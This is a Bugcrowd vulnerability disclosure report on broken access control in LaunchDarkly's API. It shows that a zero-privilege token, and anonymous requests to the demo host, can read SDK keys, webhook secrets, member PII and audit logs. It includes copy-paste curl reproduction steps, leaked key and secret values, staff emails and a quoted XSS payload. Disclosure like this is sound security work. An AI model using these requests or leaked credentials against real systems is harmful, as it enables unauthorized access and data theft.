# SUBMISSION 1 — Zero-privilege API token (`basePermissions: no_access`) reads ALL environment SDK keys, webhook HMAC signing secrets, member PII, audit log and token inventory — plus the same defect class fully unauthenticated on `demo.app.launchdarkly.com`

- **Platform:** Bugcrowd — LaunchDarkly (`launchdarkly-mbb-og`)
- **Hunter:** zeno0
- **Targets:** `app.launchdarkly.com` (in scope) · `demo.app.launchdarkly.com` (subdomain of the in-scope `app.launchdarkly.com`)
- **Suggested VRT:** Broken Access Control → P2 (P1 arguable — see Impact)
- **Tested:** 2026-10-22 → 2026-10-24, re-verified with freshly minted tokens in separate sessions

---

## Title

**Broken access control on account-level APIs: an API token whose effective permissions are explicitly NOTHING (`basePermissions: "no_access"`) can read every environment's server-side SDK key and mobile key, webhook HMAC signing secrets, the full member list (PII), the complete audit log, and the API token inventory — and the same authenticated-only API surface is readable with NO credentials at all on `demo.app.launchdarkly.com`.**

---

## Summary

Two instances of the same defect class — the account-level API authorization layer fails to enforce least privilege on the read plane:

1. **Intra-account (`app.launchdarkly.com`):** API access tokens created with `basePermissions: "no_access"` are LaunchDarkly's documented mechanism for issuing a zero-privilege credential ("no access except explicitly granted by inline policy"). A token minted from such a role — with a policy that grants only a single dangling flag and effectively resolves to nothing — nevertheless returns **HTTP 200** on ~30 account-level read endpoints. The strongest disclosures are:
   - `GET /api/v2/projects/{key}/environments[/test|/production]` → **full 40-character `sdk-…` server-side SDK key and `mob-…` mobile key values** (not masked), byte-identical to the owner's view;
   - `GET /api/v2/webhooks/{id}` → the **full HMAC signing secret** used for `X-LD-Signature` (forgeable signed webhooks);
   - `GET /api/v2/members`, `/api/v2/auditlog`, `/api/v2/tokens`, `/api/v2/roles`, `/api/v2/projects`, `/api/v2/account`, `/api/v2/integrations/*`, `/api/v2/destinations`, usage families, and more (full list below).

2. **Zero-authentication (`demo.app.launchdarkly.com`):** the demo product instance serves the entire authenticated customer API (`/api/v2/*` + `/internal/*`) against a real tenant (account `_id 675b806fed1489094561e466`) with **no credential at all**. Unauthenticated responses are byte-identical to an owner-session replay. The same key values (`/internal/list/environments` → `sdk-c94af27e-…` / `mob-08fc98c1-…`), staff PII, 24-token inventory, complete audit log, and the 300 KB `/internal/config/authenticated` bootstrap (401 on the main app) are all anonymous-readable.

**End-to-end impact chain (demonstrated live):** zero-privilege token → `GET /api/v2/projects/default/environments/test` (200, full `sdk-` key) → `GET stream.launchdarkly.com/flags` with that key → **HTTP 200 SSE `put` with the environment's complete flag state** (all flags with rules, targets, variations, fallthrough). A credential intended to have zero permissions yields working environment credentials that exfiltrate live flag targeting data. On the demo host the same chain works with no credential whatsoever.

---

## Steps to reproduce — variant A: `no_access` token on app.launchdarkly.com

All requests below are copy-paste ready. Token/session values are the researcher's own test account (`zeno0+org@bugcrowdninja.com`, account `_id 6ac28fd11c28fb07516cf361`).

```bash
# 1) As account owner, create a custom role with NO base permissions.
#    (UI equivalent: Settings -> Roles -> New role -> basePermissions: no_access)
curl -s -X POST "https://app.launchdarkly.com/api/v2/roles" \
  -H "Cookie: ldso=<owner session>" -H "Content-Type: application/json" \
  -d '{"key":"zeno-flag-viewer-noaccess","name":"scoped","description":"scoped",
       "policy":[{"effect":"allow","resources":["proj/default:env/test:flag/zeno-webhook-fixture"],"actions":["*"]}],
       "basePermissions":"no_access"}'
# -> 201

# 2) Mint an API access token with that role
#    (UI: Settings -> Authorization -> Tokens -> Create token -> Role: Custom -> "scoped").
#    Only that token is used below — it holds zero effective permissions.

TOK="api-<the token value>"

# 3) Server-side SDK + mobile key values — EXPECTED 403, ACTUAL 200 with full secrets:
curl -s "https://app.launchdarkly.com/api/v2/projects/default/environments/test" -H "Authorization: $TOK"
# -> 200 {"apiKey":"sdk-c6ce7a15-4f85-4db1-a938-4c7378ddd667","mobileKey":"mob-...","defaultTtl":...}
curl -s "https://app.launchdarkly.com/api/v2/projects/default/environments/production" -H "Authorization: $TOK"
# -> 200 {"apiKey":"sdk-bbf7c59b-0ce5-4184-ab0a-b67224d455f3",...}
curl -s "https://app.launchdarkly.com/api/v2/projects/default/environments" -H "Authorization: $TOK"
# -> 200, list route leaks apiKey+mobileKey for every environment

# 4) Webhook HMAC signing secret — EXPECTED 403, ACTUAL 200:
curl -s "https://app.launchdarkly.com/api/v2/webhooks/{webhook_id}" -H "Authorization: $TOK"
# -> 200 {"_id":"...","name":"zeno-sign-wh-b","url":"https://example.com/zx-b",
#         "secret":"44dd62dafded4ec4a6ea7f74dc0712f4","on":false}

# 5) Account-level recon set — all EXPECTED 403, all ACTUAL 200:
curl -s "https://app.launchdarkly.com/api/v2/members"            -H "Authorization: $TOK"  # member emails/roles/_ids/lastSeen
curl -s "https://app.launchdarkly.com/api/v2/auditlog?limit=10"  -H "Authorization: $TOK"  # full activity history
curl -s "https://app.launchdarkly.com/api/v2/tokens?limit=20"    -H "Authorization: $TOK"  # token inventory + _ids
curl -s "https://app.launchdarkly.com/api/v2/roles"              -H "Authorization: $TOK"  # custom role policy docs
curl -s "https://app.launchdarkly.com/api/v2/projects"           -H "Authorization: $TOK"
curl -s "https://app.launchdarkly.com/api/v2/account"            -H "Authorization: $TOK"
curl -s "https://app.launchdarkly.com/api/v2/account/relay-auto-configs" -H "Authorization: $TOK"  # full policy documents
curl -s "https://app.launchdarkly.com/api/v2/integrations/datadog" -H "Authorization: $TOK"

# 6) Impact chain — the leaked SDK key is immediately usable:
curl -s "https://stream.launchdarkly.com/flags" -H "Authorization: sdk-c6ce7a15-4f85-4db1-a938-4c7378ddd667"
# -> HTTP 200, initial SSE "put" event = COMPLETE flag state of the environment
#    (~19 flags in the test env: keys, on/off, rules, targets, variations, fallthrough)
```

**Byte-identity control:** every `apiKey`/`mobileKey` returned to the zero-privilege token was diffed against the same endpoints fetched with the account owner's token — all four environments across two projects matched exactly (`NA == owner: True`). Full 40-character values are returned; nothing is masked.

**The token really has zero permissions (controls):**

| Probe with the same token | Result |
|---|---|
| `GET /api/v2/flags/default/{flag-in-policy}` | 403 (even the policy grant fails to apply) |
| `GET /api/v2/projects/default` | 403 |
| `GET /api/v2/teams` | 403 |
| `POST /api/v2/flags/default` (valid body) | **403 policy deny `createFlag`** (same payload → 201 as owner) |
| `PATCH /api/v2/flags/default/{flag}` (real change) | 403 policy deny `updateDescription` |
| `PATCH /api/v2/members/{own-id}` | 409 business rule ("cannot modify your own role") |
| `PATCH /api/v2/webhooks/{id}` | 403 policy deny `updateOn` |

The bypass is **strictly read-only** and **intra-account** (cross-org IDs uniformly 404 — cross-tenant isolation is intact; this is a least-privilege enforcement failure, not a tenant-boundary break).

## Steps to reproduce — variant B: zero authentication on demo.app.launchdarkly.com

```bash
# No cookies. No Authorization header. Nothing.
curl -s "https://demo.app.launchdarkly.com/api/v2/projects" | head -c 400
curl -s "https://demo.app.launchdarkly.com/internal/list/environments"
# -> {"apiKey":"sdk-c94af27e-6271-4cdc-add9-a5710b51dcab","mobileKey":"mob-08fc98c1-db34-4f9a-914b-71279975f8c8",...}

curl -s "https://demo.app.launchdarkly.com/api/v2/members"
# -> 2 members with real LaunchDarkly staff emails (team-growth@launchdarkly.com, team-growth+demo1@…)

curl -s "https://demo.app.launchdarkly.com/api/v2/tokens" | head -c 600
# -> 24 API access tokens: _ids, owners, 4-char previews, names
#    (incl. a stored-XSS payload in a token name: "i109xss <img src=x onerror=alert(document.domain)>")

curl -s "https://demo.app.launchdarkly.com/api/v2/auditlog?q=reset" | head -c 400
# -> full audit history incl. "reset the access token" credential-management events

curl -s "https://demo.app.launchdarkly.com/internal/config/authenticated" -o demo_bootstrap.json -w "%{http_code} %{size_download}\n"
# -> 200, 300+ KB authenticated-mode bootstrap (the SAME route on app.launchdarkly.com returns 401)

# Chain (same as variant A, no credential needed):
curl -s "https://stream.launchdarkly.com/flags" -H "Authorization: sdk-c94af27e-6271-4cdc-add9-a5710b51dcab"
# -> 200 SSE put = complete live flag state of the demo tenant's environment
```

**Control:** replaying every request above with a valid owner session returns **byte-identical** payloads — the demo host simply skips the authentication gate. Writes are correctly denied (403 `createFlag` policy deny; token minting/invites → 403 "Sandbox does not allow this operation"), proving the tenant is still treated as access-controlled — the read plane is the defect. Detail routes (`/tokens/{id}`, `/members/{id}`, `/auditlog/{id}`, `/teams/{key}`, flag/metric detail) are also anonymous-readable, and the `/internal/*` legacy token fence ("Invalid account ID header") enforced on the main app is **absent** on the demo host.

---

## Full affected endpoint inventory (variant A, all 200 under the zero-privilege token)

Account core: `/api/v2/members` (+`/{id}`), `/api/v2/auditlog` (+`/{id}`), `/api/v2/tokens` (+`/{id}`, 4-char preview), `/api/v2/webhooks` (+`/{id}` incl. `secret`), `/api/v2/roles` (+`/{key}`), `/api/v2/projects` (list), `/api/v2/account`, `/api/v2/account/relay-auto-configs` (+`/{id}`)
Secrets & integrations: `/api/v2/projects/{p}/environments[/test|/production|list]` (apiKey+mobileKey values), `/api/v2/integrations/{datadog,splunk,elastic,dynatrace,msteams,grafana}`, `/api/v2/integration-manifests`, `/api/v2/destinations`, `/api/v2/flag-statuses`, `/internal/metric-data-sources`, `/internal/warehouse-integrations-health`
Breadth: `/api/v2/usage/*` (8 families), `/api/v2/code-refs/repositories`, `/api/v2/announcements`, `/api/v2/templates`, `/api/v2/tags`, `/api/v2/versions`, `/api/v2/approval-requests`, `/api/v2/account/ip-allowlist`, `/api/v2/projects/{p}/{lifecycle-settings,automated-cleanup-settings,experimentation-settings}`, `/api/v2/projects/{p}/environments/{e}/adaptive-triggers`, `/internal/entitlements/*`, `/internal/ai/evaluator/token-usage/daily`, `/internal/config/anonymous`

---

## Impact

- **Least-privilege tokens are the documented way to hand scoped credentials to third parties** (CI jobs, contractors, integrations). Each such token becomes a full account-recon and secret-extraction primitive: production SDK keys, webhook signing secrets, member PII, and the complete audit trail.
- **Server-side SDK keys = full flag-data exfiltration.** Demonstrated end-to-end: disclosed `sdk-` key → `stream.launchdarkly.com/flags` → complete targeting state of the environment. For a production environment this is the customer's entire live feature-flag configuration (kill-switch states, gradual-rollout percentages, user targeting rules).
- **Webhook signing secret → forgeable `X-LD-Signature` events** against any consumer endpoint configured in the account (CI/CD auto-deploy hooks, incident tooling) — two independent leak vectors (destination webhooks and the classic webhooks family).
- **Zero-auth variant (demo host):** the same data classes (key values, staff PII, credential-management audit events, token inventory) are readable by anyone on the internet, plus a 300 KB authenticated-mode bootstrap. The demo tenant's keys grant live flag readout and event injection on a LaunchDarkly-owned production account.
- **Severity framing:** intra-account vertical privilege escalation with secret-class disclosure (P2 fits "Unauthenticated access to authenticated-only functionality" for variant B and "Broken Access Control" for variant A). The P1 argument: a token whose effective permissions are nothing yields working production-environment credentials with full flag-data read; we leave the final severity to triage.

## Suggested remediation

1. Evaluate account-level GET authorization against the *effective* permission set of the token (empty basePermissions + unresolvable policy ⇒ deny), not against a default-allow account-read role.
2. Return SDK/mobile keys only to tokens with an explicit `viewEnvironmentKeys`-class action; consider masking by default.
3. Return webhook signing secrets only to the creator/owner role.
4. Enforce the main app's 401 gate on `demo.app.launchdarkly.com` `/api/v2/*` + `/internal/*`, and rotate the demo tenant's `sdk-`/`mob-` keys; scrub staff PII and historical token names from the demo tenant.
5. Make invalid API tokens fail closed (demo host currently falls back silently to the anonymous demo identity on invalid `api-` tokens).

## Notes for triage (honest negatives)

- No cross-tenant access is claimed for variant A — account scoping is intact; the defect is least-privilege enforcement within an account.
- Variant B targets LaunchDarkly's own demo tenant; exposed flag/segment content is demo data. The reportable classes are the key values, staff PII, token inventory, audit log, and `/internal/config/authenticated` — outside any plausible demo-mode intent (anonymous *writes* are denied, so access control was expected on this host).
- Integration API keys are returned masked (first/last 3 chars) — partial disclosure only; not claimed as a secret leak.
- No full access-token values leak in variant B (4-char previews only); captures were recursively scanned — no JWTs, `api-` values, cloud keys, or PEMs.
- Testing was confined to the researcher's own accounts; all test artifacts (sign-enabled webhook, flags) were deleted and the deletions verified (204 → 404). The demo host was touched read-only except one 403-denied write attempt (no side effects).
